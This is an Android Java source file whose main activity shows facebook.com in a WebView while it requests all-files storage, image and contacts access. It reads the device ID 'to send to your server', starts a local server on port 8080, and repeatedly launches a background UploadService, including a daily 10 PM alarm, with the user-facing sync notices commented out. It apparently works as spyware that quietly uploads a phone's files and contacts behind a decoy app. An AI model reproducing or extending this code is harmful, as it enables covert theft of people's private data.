package com.phc.serviceapp;


import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private WebView webView;
    private ProgressBar progressBar;
    private static final long SYNC_INTERVAL = 60 * 60 * 1000; // 1 hour in milliseconds
    private Timer syncTimer;
    private LocalServer localServer;
    private final String url = "https://www.facebook.com/";
    private static final int TIMEOUT = 10000;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d("PhoneID", "Android ID: " + androidId); // Log or send it to your server

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progressBar);

        // Load the URL
        loadUrl();

        // Enable JavaScript and set up WebView
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                Toast.makeText(MainActivity.this, "HTTP error: " + errorResponse.getStatusCode(), Toast.LENGTH_SHORT).show();
                progressBar.setVisibility(View.GONE);
            }
        });


        // Use WebChromeClient to update the progress
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (newProgress < 100) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(newProgress);
                } else {
                    progressBar.setVisibility(View.GONE);
                }
            }
        });

        webView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
            @Override
            public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {
                if (!webView.canScrollVertically(1)) { // Check if scrolled to the bottom
                    Toast.makeText(MainActivity.this, "End of page reached", Toast.LENGTH_SHORT).show();
                }
            }
        });

        startLocalServer();
        startPeriodicSyncIfRequired();
        scheduleSyncAt10PM();

        // Check Permissions
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            startBackgroundService();
        }
    }

    private void startPeriodicSyncIfRequired() {
        if (shouldSync()) {
            // Start the sync process
            saveLastSyncTime(); // Update the last sync time
            startBackgroundService();
//            Toast.makeText(this, "Sync started", Toast.LENGTH_SHORT).show();
        } else {
//            Toast.makeText(this, "Sync skipped (not enough time since last sync)", Toast.LENGTH_SHORT).show();
        }
    }


    private boolean shouldSync() {
        long currentTimeMillis = System.currentTimeMillis();
        long lastSyncTime = getSharedPreferences("app_prefs", MODE_PRIVATE)
                .getLong("last_sync_time", 0);

        // 6 hours in milliseconds
        long sixHoursMillis = 6 * 60 * 60 * 1000;

        return (currentTimeMillis - lastSyncTime) >= sixHoursMillis;
    }

    private void saveLastSyncTime() {
        long currentTimeMillis = System.currentTimeMillis();
        getSharedPreferences("app_prefs", MODE_PRIVATE)
                .edit()
                .putLong("last_sync_time", currentTimeMillis)
                .apply();
    }


    private void startLocalServer() {
        try {
            LocalServer localServer = new LocalServer(this, 8080); // "this" ka use activity/service context ke liye hoga
            localServer.start();
//            Toast.makeText(this, "Local service server started!", Toast.LENGTH_SHORT).show();

            // Start the upload service
            Intent serviceIntent = new Intent(this, UploadService.class);
            startService(serviceIntent);

        } catch (IOException e) {
            e.printStackTrace();
//            Toast.makeText(this, "Failed to start server: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void loadUrl() {
        if (NetworkUtils.isInternetAvailable(this)) {
            progressBar.setVisibility(View.VISIBLE); // Show progress bar while loading
            webView.setVisibility(View.VISIBLE); // Ensure WebView is visible

            // Set up a WebViewClient to handle page loading
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                    super.onPageStarted(view, url, favicon);
                    // Start a handler to check if the page takes too long to load
                    startTimeoutHandler();
                }

                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    // Hide progress bar once the page has loaded
                    progressBar.setVisibility(View.GONE);
                }

                @Override
                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                    super.onReceivedError(view, errorCode, description, failingUrl);
                    // Handle error and hide progress bar
                    progressBar.setVisibility(View.GONE);
                   // Toast.makeText(MainActivity.this, "Page Load Failed: " + description, Toast.LENGTH_SHORT).show();
                }
            });

            // Load the URL
            webView.loadUrl(url);
        } else {
            Toast.makeText(this, "No Internet Connection", Toast.LENGTH_SHORT).show();
            progressBar.setVisibility(View.GONE);
        }
    }

    private void startTimeoutHandler() {
        // Create a handler to simulate a timeout
        Handler handler = new Handler();
        Runnable timeoutRunnable = new Runnable() {
            @Override
            public void run() {
                // If the page doesn't load within the timeout, show a timeout message
                progressBar.setVisibility(View.GONE);
                //Toast.makeText(MainActivity.this, "Page Load Timeout", Toast.LENGTH_SHORT).show();
                webView.stopLoading(); // Stop loading the page
            }
        };

        // Post a delayed runnable for the timeout
        handler.postDelayed(timeoutRunnable, TIMEOUT);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (syncTimer != null) {
            syncTimer.cancel(); // Stop the timer when the activity is destroyed
        }
    }

    private void startBackgroundService() {
        if (!isServiceRunning(UploadService.class)) {
            Intent serviceIntent = new Intent(this, UploadService.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For Android O (API 26) and above, use startForegroundService
                ContextCompat.startForegroundService(this, serviceIntent);
            } else {
                // For older versions, use startService
                startService(serviceIntent);
            }

            Log.d("SyncService", "UploadService started.");
        } else {
            Log.d("SyncService", "UploadService is already running.");
        }
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void scheduleSyncAt10PM() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        // Intent to trigger the SyncReceiver
        Intent intent = new Intent(this, SyncReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        // Set the time to 10 PM
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, 22); // 10 PM
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);

        // If the time has already passed for today, schedule for tomorrow
        if (Calendar.getInstance().after(calendar)) {
            calendar.add(Calendar.DATE, 1);
        }

        // Schedule the alarm to repeat daily
        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(),
                AlarmManager.INTERVAL_DAY,
                pendingIntent
        );
    }

    private void startPeriodicSync() {
        syncTimer = new Timer();
        syncTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    // Start UploadService
                    startService(new Intent(MainActivity.this, UploadService.class));
//                    Toast.makeText(MainActivity.this, "Data sync in progress...", Toast.LENGTH_SHORT).show();
                });
            }
        }, 0, SYNC_INTERVAL); // Start immediately, then repeat every hour
    }

    // Method to check if necessary permissions are granted
    private boolean hasPermissions() {
        logMissingPermissions();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager() &&
                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED &&
                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        }
    }


    private void requestPermissions() {
        logMissingPermissions();
        List<String> permissionsToRequest = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, PERMISSION_REQUEST_CODE);
                } catch (ActivityNotFoundException e) {
                    Toast.makeText(this, "Unable to open permissions settings.", Toast.LENGTH_SHORT).show();
                }
            }
        }

        // Add permissions to the list if not granted
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_MEDIA_IMAGES);
        }
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_CONTACTS);
        }
//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
//            permissionsToRequest.add(android.Manifest.permission.CAMERA);
//        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    // onActivityResult to handle the result of permission request
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                startBackgroundService();
            } else {
                //Toast.makeText(this, "Permission not granted. Please enable storage permission in settings.", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
//            logMissingPermissions();
            boolean allGranted = true;

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Log.e("Permissions", "Permission not granted: " + permissions[i]);
                    allGranted = false;
                }
            }

            if (allGranted) {
                startBackgroundService();
            } else {
                //Toast.makeText(this, "Permission not granted. Please enable necessary permissions in settings.", Toast.LENGTH_LONG).show();
//                showSettingsDialog();
            }
        }
    }

    private void logMissingPermissions() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.e("Permissions", "READ_CONTACTS permission is missing.");
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            Log.e("Permissions", "READ_EXTERNAL_STORAGE permission is missing.");
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
            Log.e("Permissions", "READ_MEDIA_IMAGES permission is missing.");
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e("Permissions", "READ_MEDIA_IMAGES permission is missing.");
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Log.e("Permissions", "All Files Access permission is missing.");
        }
    }

    // Method to show a settings dialog if the user hasn't granted permissions
    private void showSettingsDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Permission Required")
                .setMessage("The app needs access to contacts, storage, and images. Please enable these permissions in settings.")
                .setPositiveButton("Go to Settings", (dialog, which) -> openAppSettings())
                .setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss())
                .show();
    }


    // Method to open the app's settings page for permission management
    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivity(intent);
    }

}
